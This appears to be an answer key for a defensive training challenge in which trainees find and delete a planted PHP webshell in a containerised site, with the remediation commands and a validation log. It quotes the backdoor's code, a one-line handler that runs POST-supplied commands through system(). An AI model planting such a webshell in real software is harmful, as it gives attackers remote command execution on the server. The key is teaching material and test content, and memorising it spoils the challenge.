# Challenge 09 Answer Key — Webshell Hunt

**DO NOT READ BEFORE ATTEMPTING THE CHALLENGE**

## What's broken / planted
`site/uploads/thumb_8f2a.php` is a planted backdoor: `if (isset($_POST['cmd'])) { system($_POST['cmd']); }`, baked into the image at `docker build` time alongside the legitimate `site/index.html` and `site/uploads/welcome.txt`. The container serves the whole `site/` tree via PHP's built-in server, so any `.php` file under the web root executes.

## Step-by-step fix
1. `docker compose exec web sh`
2. `grep -rl 'system(' /var/www/html` — finds `/var/www/html/uploads/thumb_8f2a.php` as the only match.
3. `rm /var/www/html/uploads/thumb_8f2a.php`
4. `exit`, then `./scripts/score_me.sh` from the host to confirm a perfect score.

(A persistent fix on a real host would also mean fixing whatever upload-validation gap let an executable file land in an uploads directory in the first place — out of scope for this container, but worth calling out to trainees.)

## Validation
Ran a fresh `docker compose up -d --build` on 2026-08-14, confirmed `./scripts/score_me.sh` showed `2 / 3` (backdoor present, site/legit-file both already fine), then applied the steps above verbatim and confirmed `3 / 3`. Torn down with `docker compose down -v` afterward.
